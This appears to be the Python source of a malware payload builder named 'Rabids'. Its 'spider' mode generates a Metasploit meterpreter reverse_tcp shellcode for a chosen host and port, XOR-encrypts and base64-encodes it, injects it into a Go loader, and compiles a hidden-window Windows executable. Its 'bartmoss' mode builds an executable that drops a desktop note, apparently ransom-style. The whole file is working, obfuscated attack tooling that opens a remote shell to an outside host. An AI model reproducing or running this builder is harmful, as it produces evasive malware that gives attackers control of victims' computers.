import subprocess
import base64
import os
import argparse
import sys
import pathlib
from compiler import compile_ily

SCRIPT_ROOT = os.path.dirname(os.path.abspath(__file__))


def print_rabids_guide():
    print("\033[1;35mRabids Spider Payload Builder Options:\033[0m")
    print("  -rabids -spider -lhost <LHOST> -lport <LPORT> -key <XOR_KEY>")
    print("  -rabids -bartmoss -note <NOTE>")
    print("\033[93mTip:\033[0m You can use single dash for all options.\n")

def generate_shellcode(lhost, lport):
    cmd = f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f raw"
    result = subprocess.run(cmd, shell=True, check=True, capture_output=True)
    return result.stdout

def xor_encrypt(data, key):
    return bytes([b ^ key for b in data])

def update_main_go(base64_shellcode):
    main_go_path = os.path.join(SCRIPT_ROOT, "source", "spider", "main.go")
    with open(main_go_path, "r") as f:
        lines = f.readlines()
    for i, line in enumerate(lines):
        if line.strip().startswith("base64String := "):
            lines[i] = f'\tbase64String := "{base64_shellcode}"\n'
    with open(main_go_path, "w") as f:
        f.writelines(lines)

def build_go_exe():
    bin_dir = os.path.join(SCRIPT_ROOT, "bin")
    os.makedirs(bin_dir, exist_ok=True)
    main_go = os.path.join(SCRIPT_ROOT, "source", "spider", "main.go")
    exe_path = os.path.join(bin_dir, "main.exe")
    build_cmd = f'GOOS=windows GOARCH=amd64 go build -ldflags="-H windowsgui" -o "{exe_path}" "{main_go}"'
    subprocess.run(build_cmd, shell=True, check=True)
    return exe_path

def update_bartmoss_main_go(note):
    main_ily_path = os.path.join(SCRIPT_ROOT, "source", "bartmoss", "main.ily")
    with open(main_ily_path, "r") as f:
        lines = f.readlines()
    for i, line in enumerate(lines):
        if 'NOTEPLACEHOLDER' in line:
            lines[i] = f'    message := "{note}\\n"\n'
    with open(main_ily_path, "w") as f:
        f.writelines(lines)

def main():
    parser = argparse.ArgumentParser(description="Rabids Spider Payload Builder", add_help=False)
    parser.add_argument("-rabids", action="store_true", help="Rabids mode")
    parser.add_argument("-spider", action="store_true", help="Spider payload")
    parser.add_argument("-lhost", type=str, help="The IP address to connect to")
    parser.add_argument("-lport", type=int, help="The port to connect to")
    parser.add_argument("-key", type=int, help="The XOR key to use (0-255)")
    parser.add_argument("-bartmoss", action="store_true", help="Bartmoss payload")
    parser.add_argument("-note", type=str, help="The note to write to the desktop")
    parser.add_argument("-h", "--help", action="store_true", help="Show help message and exit")
    if len(sys.argv) == 1 or "-h" in sys.argv or "--help" in sys.argv:
        print_rabids_guide()
        sys.exit(0)
    args = parser.parse_args()
    if args.rabids and args.bartmoss:
        if not args.note:
            print("\033[1;31m✗ Error:\033[0m You must specify -note for bartmoss.")
            print_rabids_guide()
            sys.exit(1)
        note = args.note
        update_bartmoss_main_go(note)
        bin_dir = os.path.join(SCRIPT_ROOT, "bin")
        os.makedirs(bin_dir, exist_ok=True)
        ily_path = os.path.join(SCRIPT_ROOT, "source", "bartmoss", "main.ily")
        exe_path = os.path.join(bin_dir, "bartmoss.exe")
        compile_ily(ily_path, exe_path)
        print(f"Bartmoss executable built and saved at: {exe_path}")
        sys.exit(0)
    if not (args.rabids and args.spider):
        print("\033[1;31m✗ Error:\033[0m You must specify -rabids -spider.")
        print_rabids_guide()
        sys.exit(1)
    if not (args.lhost and args.lport and args.key is not None):
        print("\033[1;31m✗ Error:\033[0m You must specify -lhost, -lport, and -key for spider.")
        print_rabids_guide()
        sys.exit(1)
    lhost = args.lhost
    lport = args.lport
    key = args.key
    shellcode = generate_shellcode(lhost, lport)
    encrypted = xor_encrypt(shellcode, key)
    encrypted_b64 = base64.b64encode(encrypted).decode('utf-8')
    update_main_go(encrypted_b64)
    exe_path = build_go_exe()
    print(f"Executable built and saved at: {exe_path}")

if __name__ == "__main__":
    main()